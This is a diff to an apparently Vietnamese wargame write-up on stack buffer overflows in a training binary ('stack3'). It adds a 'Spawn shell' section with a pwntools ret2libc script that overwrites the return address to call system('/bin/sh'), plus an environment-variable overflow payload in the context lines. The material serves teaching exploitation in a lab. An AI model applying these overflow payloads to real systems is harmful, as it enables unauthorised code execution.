@@ -25,3 +25,29 @@ Cũng tương tự, bài này có thể giải quyết bằng cách control EIP 
 Payload: `export GREENIE=$(python -c 'print "a"*84+"\xef\x84\x04\x08"')`
 
 ![ret2ret](ret2ret.png)
+
+## Spawn shell
+
+vì vẫn dùng chung libc nên system address,&"/bin/sh" ko đổi, thay đổi script một chút là được.
+
+### system()
+
+```python
+#!/usr/bin/python3
+from pwn import *
+
+#system() address
+system_addr = 0xf7e11790
+info('system_addr: ' + hex(system_addr))
+#/bin/sh address
+sh_addr = 0xf7dd0000+ 0x18e363 #base address + offset
+info('sh_addr: ' + hex(sh_addr))
+padding = b"a"*64+p32(0x08048477)+b"a"*12   #padding tính từ phần trên
+payload = padding + p32(system_addr) + p32(0xdeadbeef) + p32(sh_addr)
+#run process, export GREENIE = payload
+p = process('./stack3')
+p.sendline(payload)
+p.interactive()
+```
+
+### inject shellcode
